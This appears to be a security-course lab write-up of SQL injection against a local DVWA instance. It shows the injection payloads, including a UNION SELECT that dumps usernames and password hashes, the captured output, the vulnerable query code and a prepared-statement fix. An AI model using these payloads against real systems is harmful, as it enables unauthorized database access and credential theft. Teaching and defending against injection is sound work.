# Task 3: SQL Injection on DVWA (Low Security)

 ⚠️ Disclaimer: This task is performed on a deliberately vulnerable application (DVWA) running locally for educational purposes only. Never perform these techniques on systems you do not own or have explicit written permission to test.

## Objective
Demonstrate an SQL Injection vulnerability on DVWA configured at Low security level.

## Tool Used
- DVWA — Damn Vulnerable Web Application (PHP/MySQL)

## Setup

### Install DVWA
# Using Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# OR install on LAMP stack
sudo apt install apache2 php mysql-server php-mysql -y
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa

### Configure DVWA Security Level
1. Navigate to http://localhost/dvwa
2. Login: admin / password
3. Go to DVWA Security → Set to Low
4. Click Submit

## What is SQL Injection?
SQL Injection is a web security vulnerability that allows an attacker to interfere with database queries an application makes. It can allow an attacker to:
- Bypass authentication
- Retrieve unauthorized data
- Modify or delete database records
- Execute administrative operations

## Steps Performed
### 1. Identifying the Vulnerable Input
Navigated to: http://localhost/dvwa/vulnerabilities/sqli/

The input field accepts a User ID. We test if it's vulnerable:

Input: 1'
Result: SQL error → confirms vulnerability
### 2. Basic Injection (Always-True Payload)

Payload: 1' OR '1'='1
What happens in the database:
Original query:
SELECT first_name, last_name FROM users WHERE user_id = '$id';

 After injection:
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
Result: Returns ALL users from the database since '1'='1' is always true.

### 3. UNION-Based Injection

Payload: 1' UNION SELECT user, password FROM users -- -
What happens:
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION
SELECT user, password FROM users -- -';
Result: Dumps all usernames and MD5 password hashes from the users table.

### 4. Output Captured
ID: 1' UNION SELECT user, password FROM users -- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99   (MD5 of "password")

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03   (MD5 of "abc123")
## Vulnerability Explanation

Root Cause: The low-security DVWA code uses direct string concatenation:

// VULNERABLE CODE (Low Security)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
User input is inserted directly into the SQL query with no sanitization.

## How to Fix (Secure Code)

// SECURE CODE - Using Prepared Statements
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
## Prevention Measures

| Method | Description |
|--------|-------------|
| Prepared Statements | Separate SQL code from data |
| Input Validation | Only allow expected input types |
| Least Privilege | DB account has minimal permissions |
| WAF | Web Application Firewall blocks payloads |
| Error Handling | Never expose DB errors to users |

## Files in This Repository
- sql_injection_exploit.sh — Script demonstrating the injection
- README.md — This documentation
- screenshots/ — Screenshots of the SQL injection process

## References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
